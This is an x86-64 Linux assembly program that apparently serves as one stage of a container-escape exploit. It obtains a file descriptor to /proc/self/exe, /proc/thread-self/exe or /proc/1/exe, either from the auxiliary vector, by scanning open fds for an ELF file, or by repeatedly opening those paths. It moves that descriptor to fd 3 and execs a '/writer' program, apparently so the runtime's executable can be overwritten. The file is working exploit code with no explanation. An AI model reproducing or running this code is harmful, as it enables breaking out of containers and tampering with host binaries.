.global _start

.equ SYS_OPEN, 2
.equ SYS_READ, 0
.equ SYS_CLOSE, 3
.equ SYS_LSEEK, 8
.equ SYS_NANOSLEEP, 35
.equ SYS_DUP2, 33
.equ SYS_EXECVE, 59
.equ SYS_EXIT, 60
.equ SEEK_SET, 0
.equ AT_EXECFD, 2

.section .text
_start:
	mov %rsp, %rbx
	mov (%rbx), %rcx
	lea 16(%rbx,%rcx,8), %rbx

skip_env:
	mov (%rbx), %rax
	add $8, %rbx
	test %rax, %rax
	jne skip_env

find_execfd:
	mov (%rbx), %rax
	mov 8(%rbx), %rdx
	test %rax, %rax
	je init_open_retries
	cmp $AT_EXECFD, %rax
	je use_execfd
	add $16, %rbx
	jmp find_execfd

use_execfd:
	mov %rdx, %r14
	jmp use_fd

init_open_retries:
	call find_existing_elf_fd
	test %rax, %rax
	jz init_retry_counter
	mov %rax, %r14
	jmp use_fd

init_retry_counter:
	xor %r13, %r13
	mov $500, %r12

open_proc_self_exe:
	mov $SYS_OPEN, %rax
	lea proc_self_exe(%rip), %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	syscall
	test %rax, %rax
	jns open_ready
	mov %rax, %r13

	mov $SYS_OPEN, %rax
	lea proc_thread_self_exe(%rip), %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	syscall
	test %rax, %rax
	jns open_ready
	mov %rax, %r13

	mov $SYS_OPEN, %rax
	lea proc_1_exe(%rip), %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	syscall
	test %rax, %rax
	jns open_ready
	mov %rax, %r13

	dec %r12
	jz exit_open_failed
	mov $SYS_NANOSLEEP, %rax
    lea retry_delay(%rip), %rdi
    xor %rsi, %rsi
    syscall
	jmp open_proc_self_exe

open_ready:
    mov %rax, %r14
    mov %rax, %rdi
    call is_elf_fd
    test %rax, %rax
    jz open_ready_bad_fd
	jmp use_fd

open_ready_bad_fd:
    mov $SYS_CLOSE, %rax
    mov %r14, %rdi
    syscall
    jmp scan_fds

scan_fds:
	call find_existing_elf_fd
	test %rax, %rax
	jz exit_open_failed_final
	mov %rax, %r14
	jmp use_fd

find_existing_elf_fd:
	mov $3, %r15

scan_fd_loop:
	cmp $64, %r15
	jg scan_fd_not_found

	mov $SYS_LSEEK, %rax
	mov %r15, %rdi
	xor %rsi, %rsi
	mov $SEEK_SET, %rdx
	syscall
	test %rax, %rax
	js scan_next_fd

    mov %r15, %rdi
    call is_elf_fd
    test %rax, %rax
    jz scan_next_fd

	mov %r15, %rax
	ret

scan_next_fd:
	inc %r15
	jmp scan_fd_loop

scan_fd_not_found:
	xor %rax, %rax
	ret

is_elf_fd:
    push %rbx
    mov %rdi, %rbx
    mov $SYS_LSEEK, %rax
    xor %rsi, %rsi
    mov $SEEK_SET, %rdx
    syscall
    test %rax, %rax
    js is_elf_fd_fail

    mov $SYS_READ, %rax
    mov %rbx, %rdi
    lea elf_magic_buf(%rip), %rsi
    mov $4, %rdx
    syscall
    cmp $4, %rax
    jne is_elf_fd_fail
    cmpl $0x464c457f, elf_magic_buf(%rip)
    jne is_elf_fd_fail
    mov $1, %rax
    pop %rbx
    ret

is_elf_fd_fail:
    xor %rax, %rax
    pop %rbx
	ret

use_fd:
	mov %r14, %rax
	cmp $3, %rax
	je exec_writer
	mov %rax, %rdi
	mov $3, %rsi
	mov $SYS_DUP2, %rax
	syscall
	test %rax, %rax
	js exit_dup_failed

exec_writer:
	lea argv(%rip), %rsi
	lea writer_path(%rip), %rax
	mov %rax, (%rsi)
	lea fd3_path(%rip), %rax
	mov %rax, 8(%rsi)
	movq $0, 16(%rsi)
	lea envp(%rip), %rdx
	movq $0, (%rdx)
	mov $SYS_EXECVE, %rax
	lea writer_path(%rip), %rdi
	syscall

	mov $103, %rdi
	jmp exit_with_code

exit_open_failed:
	jmp scan_fds

exit_open_failed_final:
	mov %r13, %rdi
	neg %rdi
	add $120, %rdi
	jmp exit_with_code

exit_dup_failed:
	mov $102, %rdi
	jmp exit_with_code

exit_with_code:
	mov $SYS_EXIT, %rax
	syscall

.section .rodata
proc_self_exe:
	.asciz "/proc/self/exe"
proc_thread_self_exe:
	.asciz "/proc/thread-self/exe"
proc_1_exe:
	.asciz "/proc/1/exe"
writer_path:
	.asciz "/writer"
fd3_path:
    .asciz "3"
retry_delay:
    .quad 0
    .quad 10000000

.section .bss
.balign 8
elf_magic_buf:
	.skip 4
argv:
	.skip 24
envp:
	.skip 8
